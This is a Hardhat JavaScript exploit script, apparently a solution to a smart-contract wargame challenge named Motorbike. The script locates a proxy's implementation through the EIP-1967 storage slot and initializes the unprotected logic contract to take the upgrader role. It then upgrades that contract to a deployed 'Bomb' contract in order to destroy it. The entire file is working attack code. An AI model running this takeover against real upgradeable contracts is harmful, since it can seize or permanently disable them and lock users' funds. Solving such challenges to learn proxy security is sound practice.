const {ethers} = require("hardhat");
require('dotenv').config()

async function main() {
  const user = new ethers.Wallet(process.env.PRIVATE_KEY, ethers.provider);
  console.log(`User address: ${user.address}`);
  const Engine = await ethers.getContractFactory("Engine");
  const engine = Engine.attach(process.env.MOTORBIKE_ADDR);
  const implementationAddr = '0x' + (await ethers.provider.getStorageAt(engine.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')).slice(26);
  console.log(`slot implemtation: ${implementationAddr}`);
  console.log(`engine 1st slot: ${await ethers.provider.getStorageAt(engine.address, 0)}`);
  console.log(`implementation 1st slot: ${await ethers.provider.getStorageAt(implementationAddr, 0)}`);
  let code = await ethers.provider.getCode(engine.address);
  console.log(`code: ${code}`);
  const implementation = Engine.attach(implementationAddr);
  let tx = await implementation.connect(user).initialize();
  await tx.wait();
  console.log(`implementation upgrader: ${await implementation.upgrader()}`);
  const Bomb = await ethers.getContractFactory("Bomb");
  const bomb = await Bomb.connect(user).deploy();
  await bomb.deployed();
  console.log(`bomb address: ${bomb.address}`);
  tx = await implementation.connect(user).upgradeToAndCall(bomb.address, engine.interface.encodeFunctionData('initialize', []));
  await tx.wait();
  console.log(`engine newImpl: ${await ethers.provider.getStorageAt(implementationAddr, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')}`);
  code = await ethers.provider.getCode(engine.address);
  console.log(`code: ${code}`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
